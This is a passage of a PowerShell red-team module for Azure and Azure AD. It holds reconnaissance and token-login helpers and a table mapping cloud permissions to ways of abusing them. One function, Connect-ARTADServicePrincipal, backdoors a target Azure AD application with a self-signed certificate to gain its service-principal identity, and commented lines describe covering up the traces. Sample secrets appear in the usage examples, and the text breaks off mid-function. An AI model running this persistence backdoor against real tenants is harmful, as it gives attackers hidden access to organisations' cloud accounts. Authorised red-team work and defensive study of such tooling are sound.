#
# Azure Red Team Powershell module.
#
# Set of useful cmdlets used to collect reconnessaince data, query Azure, Azure AD or 
# Office365 for valuable intelligence and perform various offensive activities using 
# solely JWT Access Token or by interacting with related Powershell modules 
# (Az, AzureAD, AzureADPreview) as well as AZ CLI.
#
# Requirements:
#   Install-Module Az
#   Install-Module AzureAD
#   Install-Module Microsoft.Graph (optional)
#   az cli (optional)
#
# Author: 
#  Mariusz Banach / mgeeky, '22
#  <mb [at] binary-offensive.com>    
#

$KnownDangerousPermissions = @{      
    '`*/`*'                          = 'UNLIMITED PRIVILEGES IN THE ENTIRE AZURE SUBSCRIPTION!'

    'storageAccounts/read'                                = 'Allows User to read Storage Accounts and related Blobs'
    'storageAccounts/blobServices/containers/read'        = 'Allows User to read Blobs Containers'
    'storageAccounts/blobServices/containers/blobs/write' = 'Allows Users to upload malicious files to Blob Containers'

    'roleAssignments/write'          = 'Facilitates Privileges Escalation through a malicious Role Assignment'

    'virtualMachines/`*'             = 'Complete control over Azure VM can lead to a machine takeover by Running arbitrary Powershell commands (runCommand)'
    'virtualMachines/runCommand'     = 'Allows User to Compromise Azure VM by Running arbitrary Powershell commands.'
    
    'secrets/getSecret'              = 'User can read Key Vault Secret contents'
    'vaults/*/read'                  = 'User can access Key Vault Secrets.'
    'Microsoft.KeyVault/vaults/`*'   = 'User can access Key Vault Secrets.'
    'vaults/certificatecas/`*'       = 'User can access Key Vault Certificates'
    'vaults/certificates/`*'         = 'User can access Key Vault Certificates'
    'vaults/keys/`*'                 = 'User can access Key Vault Keys'
    'vaults/secrets/`*'              = 'User can access Key Vault Keys'

    'automationAccounts/`*'          = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'
    'automationAccounts/jobs/`*'     = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
    'automationAccounts/jobs/write'  = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Account Jobs'
    'automationAccounts/runbooks/`*' = 'Allows User to compromise Azure VM & Hybrid machines through Azure Automation Runbooks'

    'users/password/update'                    = 'User can reset Other non-admin user passwords'
    'users/authenticationMethods/create'       = 'User can create new Authentication Method on another user'
    'users/authenticationMethods/delete'       = 'User can delete Authentication Method of another user.'
    'users/authenticationMethods/basic/update' = 'User can update authentication methods of another user'

    '/`*'                            = 'Unlimited privileges in a specified Azure Service. May result in data compromise, infiltration and other attacks.'
}


Function Get-ARTWhoami {
    <#
    .SYNOPSIS
        Prints current authentication context

    .DESCRIPTION
        Pulls current context information from Az and AzureAD modules and presents them bit nicer.

    .PARAMETER CheckToken
        When used will attempt to validate token.

    .PARAMETER Az
        Show Az authentication context.

    .PARAMETER AzureAD
        Show AzureAD authentication context.

    .PARAMETER MGraph
        Show MGraph authentication context.

    .PARAMETER AzCli
        Show az cli authentication context.

    .EXAMPLE
        Example 1: Will show all authentication contexts supported (Az, AzureAD, MGraph, az cli)
        PS> Get-ARTWhoami

        Example 2: Will show all authentication contexts supported and validate access tokens:
        PS> Get-ARTWhoami -CheckToken

        Example 3: Will show only Az and AzureAD authentication context:
        PS> Get-ARTWhoami -Az -AzureAD
    #>

    [cmdletbinding()]
    param(
        [Switch]
        $CheckToken,

        [Switch]
        $Az,

        [Switch]
        $AzureAD,

        [Switch]
        $MGraph,

        [Switch]
        $AzCli
    )

    $All = $true

    if($Az -or $AzureAD -or $MGraph -or $AzCli) {
        $All = $false
    }

    $EA = $ErrorActionPreference
    $ErrorActionPreference = 'silentlycontinue'

    Write-Host ""

    if((Get-Command Get-AzContext) -and ($All -or $Az)) {
        
        Write-Host "=== Azure context (Az module):" -ForegroundColor Yellow
        try {
            $AzContext = Get-AzContext

            if($CheckToken) {
                try {
                    Get-AzTenant -ErrorAction SilentlyContinue | Out-Null
                    Write-Host "`n[+] Token is valid on Azure." -ForegroundColor Green
                }
                catch {
                    Write-Host "`n[-] Token is invalid on Azure." -ForegroundColor Red
                }
            }
            
            $AzContext | Select Name,Account,Subscription,Tenant | fl

        } catch {
            Write-Host "[!] Not authenticated to Azure.`n" -ForegroundColor Red
            Write-Host ""
        }
    }

    if((Get-Command Get-AzureADCurrentSessionInfo) -and ($All -or $AzureAD)) {
        Write-Host "=== Azure AD context (AzureAD module):" -ForegroundColor Yellow
        
        try {
            $AzADCurrSess = Get-AzureADCurrentSessionInfo

            if($CheckToken) {
                try {
                    Get-AzureADTenantDetail -ErrorAction SilentlyContinue | Out-Null
                    Write-Host "`n[+] Token is valid on Azure AD." -ForegroundColor Green
                }
                catch {
                    Write-Host "`n[-] Token is invalid on Azure AD." -ForegroundColor Red
                }
            }

            $AzADCurrSess | Select Account,Environment,Tenant,TenantDomain | fl

        } catch {
            Write-Host "[!] Not authenticated to Azure AD.`n" -ForegroundColor Red
            Write-Host ""
        }
    }

    if ((Get-Command Get-MGContext) -and ($All -or $MGraph)) {
        Write-Host "=== Microsoft Graph context (Microsoft.Graph module):" -ForegroundColor Yellow
        
        try {
            $mgContext = Get-MGContext

            if($CheckToken) {
                try {
                    Get-MGOrganization -ErrorAction SilentlyContinue | Out-Null
                    Write-Host "`n[+] Token is valid on Microsoft Graph." -ForegroundColor Green
                }
                catch {
                    if($PSItem.Exception.Message -like '*Insufficient privileges to complete the operation*') {
                        Write-Host "`n[+] Token is valid on Microsoft Graph." -ForegroundColor Green
                    }
                    else {
                        Write-Host "`n[-] Token is invalid on Microsoft Graph." -ForegroundColor Red
                    }
                }
            }

            $mgContext | Select Account,AppName,ContextScope,ClientId,TenantId,AuthType | fl

        } catch {
            Write-Host "[!] Not authenticated to Azure AD.`n" -ForegroundColor Red
            Write-Host ""
        }
    }

    if($All -or $AzCli) {
        Write-Host "`n=== AZ CLI context:" -ForegroundColor Yellow
        
        try {
            az account show | Out-Null

            try {
                $AzAcc = az account show | convertfrom-json

                $Coll = New-Object System.Collections.ArrayList
                
                $obj = [PSCustomObject]@{
                    Username       = $AzAcc.User.Name
                    Usertype       = $AzAcc.User.Type
                    TenantId       = $AzAcc.tenantId
                    TenantName     = $AzAcc.name
                    SubscriptionId = $AzAcc.Id
                    Environment    = $AzAcc.EnvironmentName
                }

                $null = $Coll.Add($obj)
                
                $Coll | fl

            } catch {
                Write-Host "[!] Not authenticated to AZ CLI.`n" -ForegroundColor Red
                Write-Host ""
            }
        }
        catch {
        }
    }
    
    $ErrorActionPreference = $EA
}


Function Get-ARTSubscriptionId {
    <#
    .SYNOPSIS
        Returns the first Subscription ID available.

    .DESCRIPTION
        Returns the first Subscription ID available.

    .PARAMETER AccessToken
        Azure Management Access Token

    .EXAMPLE
        PS> Get-ARTSubscriptionId -AccessToken $token
    #>

    [cmdletbinding()]
    param(
        [Parameter(Mandatory=$False)]
        [string]
        $AccessToken
    )

    try {

        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
            $headers = @{
                'Authorization' = "Bearer $AccessToken"
            }
        
            $SubscriptionId = (Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers).value.subscriptionId
        }
        else {
            $SubscriptionId = (Get-AzContext).Subscription.Id
        }

        if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) { 
            throw "Could not acquire Subscription ID!"
        }

        if( $SubscriptionId.Split(' ').Length -gt 1 ) {
            $First = $SubscriptionId.Split(' ')[0]
            Write-Warning "[#] WARNING: There are multiple Subscriptions available in this Tenant! Specify -SubscriptionId parameter to narrow down results."
            Write-Warning "             Picking the first Subscription Id: $First"

            $SubscriptionId = $First
        }

        return $SubscriptionId.Split(' ')[0]
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Parse-JWTtokenRT {
    [alias("Parse-JWTokenRT")]
    <#
    .SYNOPSIS
        Prints JWT token contents.

    .DESCRIPTION
        Parses input JWT token and prints it out nicely.

    .PARAMETER Token
        JWT token to parse.

    .PARAMETER Json
        Return parsed token as JSON object.

    .PARAMETER ShowHeader
        Include Header in token representation.

    .EXAMPLE
        PS> Parse-JWTokenRT -Token $token
    #>

    [cmdletbinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        $Token,

        [Switch]
        $Json,

        [Switch]
        $ShowHeader
    )
 
    try {
        if($Token -eq $null -or $Token.Length -eq 0 ) {
            Write-Error "Empty token."
            Return
        }

        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid JWT token!" -ErrorAction Stop }
     
        $tokenheader = $token.Split(".")[0].Replace('-', '+').Replace('_', '/')
     
        while ($tokenheader.Length % 4) { $tokenheader += "=" }

        $tokenHdrByteArray = [System.Convert]::FromBase64String($tokenheader)
        $tokenHdrArray = [System.Text.Encoding]::ASCII.GetString($tokenHdrByteArray)
        $tokhdrobj = $tokenHdrArray | ConvertFrom-Json
     
        $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
        while ($tokenPayload.Length % 4) { $tokenPayload += "=" }
     
        $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
        $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
        $tokobj = $tokenArray | ConvertFrom-Json

        if ([bool]($tokobj.PSobject.Properties.name -match "iat")) {
            $tokobj.iat = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.iat)
        }

        if ([bool]($tokobj.PSobject.Properties.name -match "nbf")) {
            $tokobj.nbf = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.nbf)
        }

        if ([bool]($tokobj.PSobject.Properties.name -match "exp")) {
            $tokobj.exp = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.exp)
        }

        if ([bool]($tokobj.PSobject.Properties.name -match "xms_tcdt")) {
            $tokobj.xms_tcdt = Get-Date ([DateTime]('1970,1,1')).AddSeconds($tokobj.xms_tcdt)
        }

        if($ShowHeader) {
            $tokobj.header = $tokhdrobj   
        }

        if($Json) {
            Return ($tokobj | ConvertTo-Json)
        }
        
        return $tokobj
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Connect-ART {
    <#
    .SYNOPSIS
        Connects to the Azure.

    .DESCRIPTION
        Invokes Connect-AzAccount to authenticate current session to the Azure Portal via provided Access Token or credentials.
        Skips the burden of providing Tenant ID and Account ID by automatically extracting those from provided Token.

    .PARAMETER AccessToken
        Specifies JWT Access Token for the https://management.azure.com resource.

    .PARAMETER GraphAccessToken
        Optional access token for Azure AD service (https://graph.microsoft.com).

    .PARAMETER KeyVaultAccessToken 
        Optional access token for Key Vault service (https://vault.azure.net).

    .PARAMETER SubscriptionId
        Optional parameter that specifies to which subscription should access token be acquired.

    .PARAMETER TokenFromAzCli
        Use az cli to acquire fresh access token.

    .PARAMETER Username
        Specifies Azure portal Account name, Account ID or Application ID.

    .PARAMETER Password
        Specifies Azure portal password.

    .PARAMETER TenantId
        When authenticating as a Service Principal, the Tenant ID must be specifed.

    .EXAMPLE
        Example 1: Authentication as a user to the Azure via Access Token:
        PS> Connect-ART -AccessToken 'eyJ0eXA...'
        
        Example 2: Authentication as a user to the Azure via Credentials:
        PS> Connect-ART -Username test@test.onmicrosoft.com -Password Foobar123%

        Example 3: Authentication as a Service Principal using added Application Secret:
        PS> Connect-ART -ServicePrincipal -Username f072c4a6-e696-11eb-b57b-00155d01ef0d -Password 'agq7Q~UZX5SYwxq2O7FNW~C_S1QNJcJrlLu.E' -TenantId b423726f-108d-4049-8c11-d52d5d388768
    #>

    [CmdletBinding(DefaultParameterSetName = 'Token')]
    Param(
        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $AccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $GraphAccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $KeyVaultAccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $SubscriptionId = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [Switch]
        $TokenFromAzCli,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Username = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Password = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Credentials')]
        [Switch]
        $ServicePrincipal,

        [Parameter(Mandatory=$False, ParameterSetName = 'Credentials')]
        [String]
        $TenantId
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if (-not (Get-Module -ListAvailable -Name Az.Accounts)) {
            Write-Verbose "Az Powershell module not installed or not loaded. Installing it..."
            Install-Module -Name Az -Force -Confirm -Scope CurrentUser -AllowClobber
        }

        if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
            if($TokenFromAzCli) {
                Write-Verbose "Acquiring Azure access token from az cli..."
                $AccessToken = Get-ARTAccessTokenAzCli -Resource https://management.azure.com
                $KeyVaultAccessToken = Get-ARTAccessTokenAzCli -Resource https://vault.azure.net
            }
            else {
                Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
                $AccessToken = Get-ARTAccessTokenAz -Resource https://management.azure.com
                $KeyVaultAccessToken = Get-ARTAccessTokenAz -Resource https://vault.azure.net
            }
        }

        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
            Write-Verbose "Azure authentication via provided access token..."
            $parsed = Parse-JWTtokenRT $AccessToken
            $tenant = $parsed.tid

            if(-not ($parsed.aud -like 'https://management.*')) {
                Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
            }

            if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.upn
            }
            elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.unique_name
            }
            else {
                Write-Verbose "Token belongs to a Service Principal."
                $account = $parsed.appId
            }

            $headers = @{
                'Authorization' = "Bearer $AccessToken"
            }

            $params = @{
                'AccessToken' = $AccessToken
                'Tenant' = $tenant
                'AccountId' = $account
            }

            if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) {

                $SubscriptionId = Get-ARTSubscriptionId -AccessToken $AccessToken
                
                if(-not ($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0)) {
                    $params["SubscriptionId"] = $SubscriptionId
                }
                else {
                    Write-Warning "Could not acquire Subscription ID! Resulting access token may be corrupted!"
                }
            }
            else {
                $params["SubscriptionId"] = $SubscriptionId
            }

            if ($KeyVaultAccessToken -ne $null -and $KeyVaultAccessToken.Length -gt 0) {
                $parsedvault = Parse-JWTtokenRT $KeyVaultAccessToken

                if(-not ($parsedvault.aud -eq 'https://vault.azure.net')) {
                    Write-Warning "Provided JWT Key Vault Access Token is not scoped to `"https://vault.azure.net`"! Instead its scope is: `"$($parsedvault.aud)`" . That will not work!"
                }

                $params["KeyVaultAccessToken"] = $KeyVaultAccessToken
            }

            if ($GraphAccessToken -ne $null -and $GraphAccessToken.Length -gt 0) {
                $parsedgraph = Parse-JWTtokenRT $GraphAccessToken

                if(-not ($parsedgraph.aud -match 'https://graph.*')) {
                    Write-Warning "Provided JWT Graph Access Token is not scoped to `"https://graph.*`"! Instead its scope is: `"$($parsedgraph.aud)`" . That will not work!"
                }

                $params["GraphAccessToken"] = $GraphAccessToken
            }

            $command = "Connect-AzAccount"

            foreach ($h in $params.GetEnumerator()) {
                $command += " -$($h.Name) '$($h.Value)'"
            }

            Write-Verbose "Command:`n$command`n"
            iex $command

            if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
                Parse-JWTtokenRT $AccessToken
            }
        }
        else {
            $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)

            if($ServicePrincipal) {

                Write-Verbose "Azure authentication via provided Service Principal creds..."

                if($TenantId -eq $null -or $TenantId.Length -eq 0) {
                    throw "Tenant ID not provided! Pass it in -TenantId parameter."
                }

                Connect-AzAccount -Credential $creds -ServicePrincipal -Tenant $TenantId

            } Else {
                Write-Verbose "Azure authentication via provided User creds..."
                Connect-AzAccount -Credential $creds
            }
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTUserId {
    <#
    .SYNOPSIS
        Gets current or specified user ObjectId.

    .DESCRIPTION
        Acquires current user or user specified in parameter ObjectId

    .PARAMETER Username
        Specifies Username/UserPrincipalName/email to use during ObjectId lookup.

    .EXAMPLE
        PS> Get-ARTUserId
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $Username
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $name = (Get-AzureADCurrentSessionInfo).Account

        if($Username -ne $null -and $Username.Length -gt 0) {
            $name = $Username
        }

        $UserId = (Get-AzureADUser -SearchString $name).ObjectId
        Return $UserId
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return $null
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Connect-ARTADServicePrincipal {
    <#
    .SYNOPSIS
        Connects to the AzureAD as a Service Principal with Certificate.

    .DESCRIPTION
        Invokes Connect-AzAccount to authenticate current session to the Azure Portal via provided Access Token or credentials.
        Skips the burden of providing Tenant ID and Account ID by automatically extracting those from provided Token.

        Then it creates self-signed PFX certificate and associates it with Service Principal for authentication.
        Afterwards, authenticates as that Service Principal to AzureAD and deassociates that certificate to cleanup

    .PARAMETER TargetApplicationName
        Specifies Enterprise Application (by Name or ObjectId) which Service Principal is to be used for authentication.

    .EXAMPLE
        Example 1: Connect via Access Token:
            PS> Connect-ARTAD -AccessToken '...'
            PS> Connect-ARTADServicePrincipal -TargetApplicationName testapp1

        Example 2: Connect via PSCredential object:
            PS> $creds = Get-Credential
            PS> Connect-AzureAD -Credential $creds
            PS> Connect-ARTADServicePrincipal -TargetApplicationName testapp1
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $TargetApplicationName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $fname = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
        $certPath = "$Env:Temp\$fname.key.pfx"
        $certStorePath = "cert:\currentuser\my"
        $appKeyIdentifier = "Test123"
        $certpwd = "VeryStrongCertificatePassword123"

        try {
            $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
        }
        catch {
            Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
            Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"

            Throw
            Return
        }

        $UserId = Get-ARTUserId

        $pwd = ConvertTo-SecureString -String $certpwd -Force -AsPlainText
        $cert = Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } 

        if($cert -eq $null -or $cert.Thumbprint -eq "") {
            Write-Verbose "Step 1. Create the self signed cert and load it to local store."
            
            $currentDate = Get-Date
            $endDate = $currentDate.AddYears(1)
            $notAfter = $endDate.AddYears(1)

            $thumb = (New-SelfSignedCertificate -CertStoreLocation $certStorePath -DnsName $certDnsName -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
        }
        else {
            Write-Verbose "Step 1. Get self signed cert and load it to local store."
            $cert
            $thumb = $cert.Thumbprint
        }

        Write-Verbose "`t1.1. Export PFX certificate to file: $certPath"
        Export-PfxCertificate -cert "$certStorePath\$thumb" -FilePath $certPath -Password $pwd | Out-Null

        Write-Verbose "Step 2. Load exported certificate"
        Write-Verbose "`t2.1. Certificate Thumbprint: $thumb"

        $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate($certPath, $pwd)
        $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

        Write-Verbose "Step 3. Get Service Principal and connect it to the Application."
        $sp = Get-AzureADServicePrincipal -Filter "DisplayName eq '$TargetApplicationName'"
        $app = Get-AzureADApplication | ? { $_.DisplayName -eq $TargetApplicationName -or $_.ObjectId -eq $TargetApplicationName }

        Write-Verbose "Step 4. Backdoor target Azure AD Application with newly created Certificate."
        $key = New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -CustomKeyIdentifier $appKeyIdentifier -StartDate $currentDate -EndDate $endDate -Type AsymmetricX509Cert -Usage Verify -Value $keyValue

        Write-Host "Perform cleanup with command:"
        Write-Host "`tPS> Remove-ARTServicePrincipalKey -ApplicationName $($app.ObjectId) -KeyId $($key.KeyId)"

        Write-Verbose "`nStep 5. Authenticate to Azure AD as a Service Principal."

        try {
            Write-Verbose "`tCooling down for 15 seconds to let Azure account for created certificate.`n"
            Start-Sleep -Seconds 15
            Connect-AzureAD -TenantId $sp.AppOwnerTenantId -ApplicationId $sp.AppId -CertificateThumbprint $thumb | Out-Null
        }
        catch {
            Write-Host "[!] Failed: Could not authenticate to Azure AD as Service Principal!"
            Return
        }

        #Write-Verbose "`n[.] To manually remove backdoor certificate from the Application and cover up traces use following command AS $((Get-AzureADCurrentSessionInfo).Account):`n"
        #Write-Verbose "`tRemove-AzureADApplicationKeyCredential -ObjectId $($app.ObjectId) -KeyId $($key.KeyId)`n"
        #Write-Verbose "`tGet-ChildItem -Path $certStorePath | where { `$_.subject -eq `"CN=$certDnsName`" } | Remove-Item"
        #Write-Verbose "`tRemove-Item -Path $certPath | Out-Null"

        Write-Host "`n`n[+] You are now authenticated as:`n"
        Get-AzureADDomain | Out-Null
        Start-Sleep -Seconds 3
        Get-AzureADCurrentSessionInfo
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Remove-ARTServicePrincipalKey {
    <#
    .SYNOPSIS
        Removes Service Principal Certificate that was used during authentication.

    .DESCRIPTION
        Performs cleanup actions after running Connect-ARTADServicePrincipal

    .PARAMETER ApplicationName
        Specifies Enterprise Application which we want to remove certificate from

    .PARAMETER KeyId
        Specifies Certificate Key ID to remove from target Application.

    .EXAMPLE
        PS> Remove-ARTServicePrincipalKey -ApplicationName testapp1 -KeyId e1be55d2-6369-4100-b063-37c5701182fd
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $ApplicationName,

        [Parameter(Mandatory=$True)]
        [String]
        $KeyId
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $certStorePath = "cert:\currentuser\my"
        $certPath = "$Env:Temp\*.key.pfx"

        try {
            $certDnsName = (Get-AzureADDomain | ? { $_.IsDefault -eq $true } ).Name
        }
        catch {
            Write-Host "[!] Get-AzureADDomain failed. Probably not authenticated."
            Write-Host "[!] Use: Connect-AzureAD or Connect-ARTAD before attempting authentication as Service Principal!"

            Throw
            Return
        }

        del $certPath | Out-Null
        Get-ChildItem -Path $certStorePath | where { $_.subject -eq "CN=$certDnsName" } | Remove-Item

        $app = Get-AzureADApplication | ? { $_.DisplayName -eq $ApplicationName -or $_.ObjectId -eq $ApplicationName }
        Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $KeyId

        Write-Host "[+] Cleanup finished."
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Connect-ARTAD {
    <#
    .SYNOPSIS
        Connects to the Azure AD and Microsoft.Graph

    .DESCRIPTION
        Invokes Connect-AzureAD (and Connect.MgGraph if module is installed) to authenticate current session to the Azure AD via provided Access Token or credentials.
        Skips the burden of providing Tenant ID and Account ID by automatically extracting those from provided Token.

    .PARAMETER AccessToken
        Specifies JWT Access Token for the https://graph.microsoft.com or https://graph.windows.net resource.

    .PARAMETER TokenFromAzCli
        Use az cli to acquire fresh access token.

    .PARAMETER Username
        Specifies Azure AD username.

    .PARAMETER Password
        Specifies Azure AD password.

    .EXAMPLE
        PS> Connect-ARTAD -AccessToken 'eyJ0eXA...'
        PS> Connect-ARTAD -Username test@test.onmicrosoft.com -Password Foobar123%
    #>

    [CmdletBinding(DefaultParameterSetName = 'Token')]
    Param(
        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [String]
        $AccessToken = $null,

        [Parameter(Mandatory=$False, ParameterSetName = 'Token')]
        [Switch]
        $TokenFromAzCli,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Username = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Credentials')]
        [String]
        $Password = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if (-not (Get-Module -ListAvailable -Name AzureAD)) {
            Write-Verbose "AzureAD Powershell module not installed or not loaded. Installing it..."
            Install-Module -Name AzureAD -Force -Confirm -Scope CurrentUser -AllowClobber
        }

        if($PsCmdlet.ParameterSetName -eq "Token" -and ($AccessToken -eq $null -or $AccessToken -eq "")) {
            Write-Verbose "Acquiring Azure access token from Connect-AzureAD..."
            if($TokenFromAzCli) {
                Write-Verbose "Acquiring Azure access token from az cli..."
                $AccessToken = Get-ARTAccessTokenAzCli -Resource https://graph.microsoft.com
            }
            else {
                Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
                $AccessToken = Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
            }
        }

        if($AccessToken -ne $null -and $AccessToken.Length -gt 0) {
            Write-Verbose "Azure AD authentication via provided access token..."
            $parsed = Parse-JWTtokenRT $AccessToken
            $tenant = $parsed.tid

            if(-not $parsed.aud -like 'https://graph.*') {
                Write-Warning "Provided JWT Access Token is not scoped to https://graph.microsoft.com or https://graph.windows.net! Instead its scope is: $($parsed.aud)"
            }

            if ([bool]($parsed.PSobject.Properties.name -match "upn")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.upn
            }
            elseif ([bool]($parsed.PSobject.Properties.name -match "unique_name")) {
                Write-Verbose "Token belongs to a User Principal."
                $account = $parsed.unique_name
            }
            else {
                Write-Verbose "Token belongs to a Service Principal."
                $account = $parsed.appId
            }

            Connect-AzureAD -AadAccessToken $AccessToken -TenantId $tenant -AccountId $account

            if(Get-Command Connect-MgGraph) {
                Connect-MgGraph -AccessToken $AccessToken
            }

            if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
                Parse-JWTtokenRT $AccessToken
            }
        }
        else {
            $passwd = ConvertTo-SecureString $Password -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential ($Username, $passwd)
            
            Write-Verbose "Azure AD authentication via provided creds..."
            Connect-AzureAD -Credential $creds

            if(Get-Command Connect-MgGraph) {
                Connect-MgGraph -Credential $creds
            }
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTAccessTokenAzCli {
    <#
    .SYNOPSIS
        Gets access token from az cli.

    .DESCRIPTION
        Acquires access token from az cli, via az accound get-access-token

    .PARAMETER AccessToken
        Optionally specifies Azure Application that acquired token should be scoped to.

    .EXAMPLE
        PS> Get-ARTAccessTokenAzCli -Resource https://graph.microsoft.com
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $Resource = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $token = $null

        if($Resource -ne $null -and $Resource.Length -gt 0) {
            $token = ((az account get-access-token --resource $Resource) | ConvertFrom-Json).accessToken
        }
        else {
            $token = ((az account get-access-token) | ConvertFrom-Json).accessToken
        }

        if ($token -eq $null -or $token.Length -eq 0) {
            throw "[!] Could not obtain token!"
        }

        $parsed = Parse-JWTtokenRT $token
        Write-Verbose "Token for Resource: $($parsed.aud)"

        Return $token
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTAccessTokenAz {
    <#
    .SYNOPSIS
        Gets access token from Az module.

    .DESCRIPTION
        Acquires access token from Az module, via Get-AzAccessToken .

    .PARAMETER AccessToken
        Optionally specifies Azure Application that acquired token should be scoped to.

    .EXAMPLE
        PS> Get-ARTAccessTokenAz -Resource https://graph.microsoft.com
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $Resource = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $token = $null

        if ($Resource -eq "https://management.azure.com" -or $Resource -eq "https://management.core.windows.net") {
            $token = (Get-AzAccessToken).Token
        }
        elseif($Resource -ne $null -and $Resource.Length -gt 0 ) {
            $token = (Get-AzAccessToken -Resource $Resource).Token

            if ($token -eq $null -or $token.Length -eq 0) {
                $APSUser = Get-AzContext *>&1 
                $token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate($APSUser.Account, $APSUser.Environment, $APSUser.Tenant.Id.ToString(), $null, [Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, $null, $Resource).AccessToken
            }
        }
        else {
            $token = (Get-AzAccessToken).Token
        }

        if ($token -eq $null -or $token.Length -eq 0) {
            throw "[!] Could not obtain token!"
        }

